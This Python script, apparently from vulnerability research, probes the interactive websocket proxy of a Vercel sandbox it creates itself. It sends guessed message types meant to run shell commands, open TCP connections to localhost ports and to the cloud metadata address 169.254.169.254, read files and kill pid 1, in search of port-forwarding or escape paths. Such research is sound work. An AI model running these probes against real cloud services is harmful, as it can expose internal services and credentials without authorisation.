# -*- coding: utf-8 -*-
"""v228: 公网 wss 代理深度探测 — 消息类型枚举 (找 connect/port-forward 类)
每个消息类型用新连接 (interactive 一次 start 后关闭)"""
import json, sys, time, socket, ssl, os, base64, struct
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ, fresh_sandbox, cmd

NAME = 'v228'


def log(s): print(s, flush=True)


# ---------- TLS + ws ----------
def tls_conn(host, port=443, timeout=8):
    ctx = ssl.create_default_context()
    raw = socket.create_connection((host, port), timeout=timeout)
    s = ctx.wrap_socket(raw, server_hostname=host)
    s.settimeout(timeout)
    return s


def ws_upgrade(s, path, tok=None, timeout=6):
    key = base64.b64encode(os.urandom(16)).decode()
    q = path + ('?token=%s' % tok if tok else '')
    req = ('GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\n'
           'Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n'
           % (q, s.server_hostname if hasattr(s, 'server_hostname') else 'x', key))
    s.settimeout(timeout)
    s.sendall(req.encode())
    resp = b''
    try:
        while b'\r\n\r\n' not in resp:
            d = s.recv(4096)
            if not d:
                break
            resp += d
    except socket.timeout:
        pass
    head, _, rest = resp.partition(b'\r\n\r\n')
    first = head.split(b'\r\n')[0]
    return first.decode(errors='replace'), rest, (b' 101 ' in first)


def ws_send_text(s, text):
    payload = text.encode()
    mask = os.urandom(4)
    n = len(payload)
    if n < 126:
        hdr = bytes([0x81, 0x80 | n])
    elif n < 65536:
        hdr = bytes([0x81, 0x80 | 126]) + struct.pack('>H', n)
    else:
        hdr = bytes([0x81, 0x80 | 127]) + struct.pack('>Q', n)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    s.sendall(hdr + mask + masked)


def ws_recv(s, timeout=3.5):
    s.settimeout(timeout)
    buf = b''
    try:
        while True:
            d = s.recv(8192)
            if not d:
                break
            buf += d
            if len(buf) > 65536:
                break
    except socket.timeout:
        pass
    except Exception as e:
        buf += ('<<ERR:%s>>' % e).encode()
    return buf


def show_frame(buf):
    """粗略解析 ws 帧 -> 文本"""
    out = []
    i = 0
    while i + 2 <= len(buf):
        b0, b1 = buf[i], buf[i + 1]
        op = b0 & 0x0F
        ln = b1 & 0x7F
        off = 2
        if ln == 126 and i + 4 <= len(buf):
            ln = struct.unpack('>H', buf[i + 2:i + 4])[0]
            off = 4
        elif ln == 127 and i + 10 <= len(buf):
            ln = struct.unpack('>Q', buf[i + 2:i + 10])[0]
            off = 10
        if i + off + ln > len(buf):
            break
        data = buf[i + off:i + off + ln]
        if op == 1:
            out.append('TXT: %r' % data[:400])
        elif op == 8:
            out.append('CLOSE')
            break
        elif op == 9:
            out.append('PING')
        elif op == 10:
            out.append('PONG')
        else:
            out.append('OP%d: %r' % (op, data[:200]))
        i += off + ln
    return ' | '.join(out)


# ---------- 探测 ----------
def probe_msgs(host, tok):
    """每个消息类型: 新连接 -> 101 -> 发消息 -> 收响应"""
    msgs = [
        ('start_basic', {"type": "start", "command": "sh", "args": ["-c", "echo V228_OK; hostname; id"],
                         "env": [], "cwd": "/vercel/sandbox", "cols": 120, "rows": 40}),
        ('exec', {"type": "exec", "command": "sh", "args": ["-c", "echo EXEC_OK"], "env": [], "cwd": "/"}),
        ('run', {"type": "run", "command": "echo RUN_OK"}),
        ('command', {"type": "command", "command": "echo CMD_OK"}),
        ('shell', {"type": "shell", "command": "echo SH_OK"}),
        ('connect_127', {"type": "connect", "host": "127.0.0.1", "port": 23456}),
        ('connect_26661', {"type": "connect", "host": "127.0.0.1", "port": 26661}),
        ('connect_host', {"type": "connect", "host": "169.254.169.254", "port": 80}),
        ('tcp', {"type": "tcp", "host": "127.0.0.1", "port": 23456}),
        ('portforward', {"type": "portforward", "host": "127.0.0.1", "port": 23456}),
        ('forward', {"type": "forward", "host": "127.0.0.1", "port": 23456}),
        ('proxy', {"type": "proxy", "host": "127.0.0.1", "port": 23456}),
        ('dial', {"type": "dial", "host": "127.0.0.1", "port": 23456}),
        ('read', {"type": "read", "path": "/etc/hostname"}),
        ('write', {"type": "write", "path": "/tmp/x", "data": "hi"}),
        ('fs', {"type": "fs", "path": "/etc/hostname"}),
        ('file', {"type": "file", "path": "/etc/hostname"}),
        ('kill', {"type": "kill", "pid": 1}),
        ('resize', {"type": "resize", "cols": 80, "rows": 24}),
        ('env', {"type": "env"}),
        ('ping', {"type": "ping"}),
        ('bogus', {"type": "zzz_nonexistent_xyz"}),
        ('empty_obj', {}),
        ('raw_text', "hello raw text"),
        ('start_connect', {"type": "start", "command": "sh", "args": ["-c", "nc -vz 127.0.0.1 23456; echo rc=$?"]}),
    ]
    for tag, m in msgs:
        try:
            s = tls_conn(host)
            first, rest, ok = ws_upgrade(s, '/ws/interactive', tok)
            if not ok:
                log('%s: upgrade %s (rest=%r)' % (tag, first, rest[:120]))
                s.close()
                continue
            ws_send_text(s, json.dumps(m))
            buf = ws_recv(s, 3.5)
            log('%s: -> %s' % (tag, show_frame(buf)[:500]))
            s.close()
        except Exception as e:
            log('%s: EXC %s' % (tag, e))
        time.sleep(0.3)


if __name__ == '__main__':
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    sid = fresh_sandbox(NAME)
    log('sid=%s' % sid)

    c, r = api('POST', '/v2/sandboxes/sessions/%s/interactive?teamId=%s' % (sid, TEAM), {}, 60)
    log('interactive -> %s' % c)
    try:
        d = json.loads(r)
        wurl = d.get('url', '')
        tok = d.get('token', '')
        log('url=%s' % wurl)
        log('token=%s...' % (tok[:12] if tok else ''))
    except Exception:
        log('resp: %s' % (r or '')[:300])
        sys.exit(1)

    host = wurl.split('://')[1].split('/')[0]
    log('host=%s' % host)
    probe_msgs(host, tok)

    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    log('DONE')
